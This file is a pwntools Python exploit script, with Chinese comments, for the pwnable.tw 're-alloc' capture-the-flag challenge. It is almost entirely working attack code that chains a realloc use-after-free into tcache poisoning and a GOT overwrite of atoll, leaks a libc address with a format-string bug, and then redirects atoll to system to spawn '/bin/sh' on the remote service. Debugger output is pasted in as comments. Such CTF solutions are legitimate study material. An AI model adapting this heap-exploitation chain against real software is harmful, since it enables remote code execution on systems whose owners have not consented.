#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf  = ELF('./re-alloc', checksec = False)
libc = ELF('./libc.so.6', checksec = False)

class Challenge:
    def __init__(self, proc):
        self.proc = proc

    def alloc(self, idx, size, data):
        self.proc.sendlineafter(b'choice: ', b'1')
        self.proc.sendlineafter(b'Index:', str(idx).encode('utf-8'))
        self.proc.sendlineafter(b'Size:', str(size).encode('utf-8'))
        self.proc.sendlineafter(b'Data:', data)

    def realloc(self, idx, size, data):
        self.proc.sendlineafter(b'choice: ', b'2')
        self.proc.sendlineafter(b'Index:', str(idx).encode('utf-8'))
        self.proc.sendlineafter(b'Size:', str(size).encode('utf-8'))
        if size == 0:
            return
        self.proc.sendlineafter(b'Data:', data)

    def free(self, idx):
        self.proc.sendlineafter(b'choice: ', b'3')
        self.proc.sendlineafter(b'Index:', str(idx).encode('utf-8'))


def main():
    proc = remote('chall.pwnable.tw', 10106)
    #proc = elf.process()
    # proc = process(['./ld.so', './elf'], env={'LD_PRELOAD': './libc.so'})
    #log.debug('You may attatch this process to gdb now.')
    #input()

    # Develop your exploit here
    chall = Challenge(proc)

    # 分配一塊 0x10 (header) + 0x10 (user) 的 heap[0].
    chall.alloc(0, 0x10, b'')

    # 利用 reallocate() 內的 UAF，將 heap[0] free() 掉，
    # 這會導致 heap[0] 被放進 tcache[0x20]
    chall.realloc(0, 0, b'')

    # 此時 heap[0] 為 freed 狀態，user data 為一個 tcache_entry，也就是 { fd, key }.
    # 如果 realloc(ptr, size) 的 ptr 在 tcache 中，則結束後 ptr 仍會存在 tcache 中.
    # 因此下面這行的操作相當於 edit 該 freed chunk 的 { fd, key }.
    # 我們把 fd 修改成 elf.got['atoll'], key 修改成 0.
    chall.realloc(0, 0x10, p64(elf.got['atoll']) + p64(0))

    # 此時的 tcache:
    # pwndbg> bins
    # tcachebins
    # 0x20 [  1]: 0x1ec6260 —▸ 0x404048 (atoll@got.plt) ◂— ...

    # 將 0x1ec6260 從 tcache[0x20] 移除, 作為 heap[1].
    chall.alloc(1, 0x10, b'')

    # 此時的 tcache:
    # pwndbg> bins
    # tcachebins
    # 0x20 [  1]: 0x404048 (atoll@got.plt) ◂— ...

    # 修改 heap[0] 大小為 0x20 以外的大小，這邊修改成 0x40
    chall.realloc(0, 0x30, b'')

    # 將 heap[0] 放進 tcache[0x40]
    chall.free(0)

    # 此時的 tcache:
    # pwndbg> bins
    # tcachebins
    # 0x20 [  1]: 0x404048 (atoll@got.plt) ◂— ...
    # 0x40 [  1]: 0x1b18260 ◂— 0x0

    # 修改 heap[0] 的 {fd,key}
    chall.realloc(1, 0x30, p64(elf.got['atoll']) + p64(0))

    # 此時的 tcache:
    # pwndbg> bins
    # tcachebins
    # 0x20 [  0]: 0x404048 (atoll@got.plt) ◂— ...
    # 0x40 [  1]: 0x1142260 —▸ 0x404048 (atoll@got.plt) ◂— ...

    # 將 0x1142260 從 tcache[0x40] 移除, 作為 heap[0].
    chall.alloc(0, 0x30, b'')

    # 此時的 tcache:
    # pwndbg> bins
    # tcachebins
    # 0x20 [  0]: 0x404048 (atoll@got.plt) ◂— ...
    # 0x40 [  0]: 0x404048 (atoll@got.plt) ◂— ...

    # 此時 heap[0], heap[1] 都是 non-null,
    # 修改他們的大小後再丟回 tcache[0x60].
    chall.realloc(0, 0x50, p64(elf.got['atoll']) + p64(0))
    chall.free(0)
    chall.realloc(1, 0x50, p64(elf.got['atoll']) + p64(0))
    chall.free(1)

    # 至此, heap[0] == heap[1] == NULL.
    # pwndbg> bins
    # tcachebins
    # 0x20 [  0]: 0x404048 (atoll@got.plt) ◂— ...
    # 0x40 [  0]: 0x404048 (atoll@got.plt) ◂— ...
    # 0x60 [  2]: 0x19ee260 ◂— 0x19ee260

    # 取出 tcache[0x40] 最前面的 chunk, 即 0x404048 (atoll@got.plt)
    # 並用 allocate() 裡的 read(0, 0x404048, size) 進行 GOT hijack,
    # 之後呼叫 atoll@plt 都等於呼叫 printf@plt.
    chall.alloc(0, 0x30, p64(elf.sym['printf']))

    # 此時的 atoll@plt
    # [0x404048] atoll@GLIBC_2.2.5 -> 0x401070 (printf@plt) ◂— jmp    qword ptr [rip + 0x2fc2]

    # 接下來打 format string bug
    # atoll(buf) -> printf(buf) -> buf 在 stack 上且 buf 內容可控
    #
    # pwndbg> telescope $rsp 20
    # 00:0000│ rsp         0x7ffc68c29bf8 —▸ 0x4012a2 (read_long+67) ◂— mov    qword ptr [rbp - 0x28], rax
    # 01:0008│             0x7ffc68c29c00 ◂— 0x1b
    # 02:0010│             0x7ffc68c29c08 —▸ 0x7f9e3ef62760 (_IO_2_1_stdout_) ◂— 0xfbad2887
    # 03:0018│ rax rdi rsi 0x7ffc68c29c10 ◂— 0xa353535 /* '555\n' */
    # 04:0020│             0x7ffc68c29c18 —▸ 0x7f9e3ee00e4a (puts+394) ◂— cmp    eax, -1
    # 05:0028│             0x7ffc68c29c20 ◂— 0x0
    # 06:0030│             0x7ffc68c29c28 ◂— 0xaaea8169db5cd200
    # 07:0038│ rbp         0x7ffc68c29c30 —▸ 0x7ffc68c29c50 —▸ 0x7ffc68c29c70 —▸ 0x401790 (__libc_csu_init) ◂— push   r15
    # 08:0040│             0x7ffc68c29c38 —▸ 0x401608 (rfree+43) ◂— mov    qword ptr [rbp - 8], rax
    # 09:0048│             0x7ffc68c29c40 ◂— 0x0
    # 0a:0050│             0x7ffc68c29c48 ◂— 0x0
    # 0b:0058│             0x7ffc68c29c50 —▸ 0x7ffc68c29c70 —▸ 0x401790 (__libc_csu_init) ◂— push   r15
    # 0c:0060│             0x7ffc68c29c58 —▸ 0x401766 (main+140) ◂— jmp    0x40177f
    # 0d:0068│             0x7ffc68c29c60 ◂— 0x368c29d50
    # 0e:0070│             0x7ffc68c29c68 ◂— 0xaaea8169db5cd200
    # 0f:0078│             0x7ffc68c29c70 —▸ 0x401790 (__libc_csu_init) ◂— push   r15
    # 10:0080│             0x7ffc68c29c78 —▸ 0x7f9e3eda3b6b (__libc_start_main+235) ◂— mov    edi, eax

    # 用 fsb 洩漏 0x7f9e3eda3b6b (__libc_start_main+235)
    # %p 會印出 address, 21$ 代表第 21th param.
    chall.free('%21$p')

    libc_leaked = int(proc.recv(14).decode('utf-8'), 16)
    libc_base = libc_leaked - (0x7f8725ec6b6b - 0x7f8725ea0000)
    log.info('leaked libc base: {}'.format(hex(libc_base)))

    # 取出 tcache[0x40] 最前面的 chunk, 即 0x404048 (atoll@got.plt)
    # 進行 GOT hijack, 這次將 atoll@got 改成 system@libc.
    proc.sendline(b'1')
    proc.sendlineafter(b'Index:', b'0\x00')
    proc.sendlineafter(b'Size:', b'A' * 14)
    proc.sendlineafter(b'Data:', p64(libc_base + libc.sym['system']) + p64(0))
    chall.free('/bin/sh\x00')

    proc.interactive()


if __name__ == '__main__':
    main()
